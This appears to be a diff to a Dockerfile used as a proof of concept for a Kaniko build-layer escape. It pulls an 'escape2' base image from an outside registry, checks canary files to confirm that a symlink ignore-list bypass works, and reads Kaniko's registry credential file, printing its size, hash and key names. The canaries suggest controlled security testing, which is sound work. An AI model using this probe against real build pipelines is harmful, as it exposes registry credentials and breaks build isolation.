@@ -1,13 +1,21 @@
-FROM up.lowvane.com/qm-kaniko-layer:escape
+FROM up.lowvane.com/qm-kaniko-layer:escape2
 RUN set -eu; \
-    echo 'QM_KANIKO_LAYER_TEST_20261121'; \
+    echo 'QM_KANIKO_IGNORE_BYPASS_TEST_20261121'; \
     test "$(cat /qm-control/inside.txt)" = 'QM_OCI_LAYER_CONTROL_20261121'; \
-    echo 'QM_CONTROL_PRESENT'; \
-    if [ -f /kaniko/qm-layer-escape-20261121.txt ]; then \
-      echo "QM_ESCAPE_PRESENT $(cat /kaniko/qm-layer-escape-20261121.txt)"; \
+    test "$(cat /root-control.txt)" = 'QM_ROOTFS_CONTROL_20261121'; \
+    echo 'QM_ROOTFS_CONTROLS_PRESENT'; \
+    if [ -e /kaniko/QM_DIRECT_BLOCKED ]; then \
+      echo 'QM_DIRECT_PATH_UNEXPECTEDLY_PRESENT'; \
+      exit 77; \
     else \
-      echo 'QM_ESCAPE_ABSENT'; \
+      echo 'QM_DIRECT_PATH_DENIED'; \
     fi; \
-    ls -lan /kaniko/.docker 2>/dev/null | sed 's/^/QM_DOCKER_ENTRY /' | head -n 80
+    test "$(cat /kaniko/QM_BASE_LAYER_CANARY)" = 'QM_KANIKO_LAYER_ESCAPE_20261121'; \
+    echo 'QM_SYMLINK_PATH_ALLOWED'; \
+    wc -c /kaniko/.docker/config.json | sed 's/^/QM_CONFIG_SIZE /'; \
+    sha256sum /kaniko/.docker/config.json | sed 's/^/QM_CONFIG_SHA256 /'; \
+    tr '{},' '\n' < /kaniko/.docker/config.json | \
+      sed -n 's/^[[:space:]]*"\([^"]*\)"[[:space:]]*:.*/QM_CONFIG_KEY \1/p' | \
+      sort -u | head -n 80
 EXPOSE 8080
 CMD ["httpd", "-f", "-p", "8080", "-h", "/"]
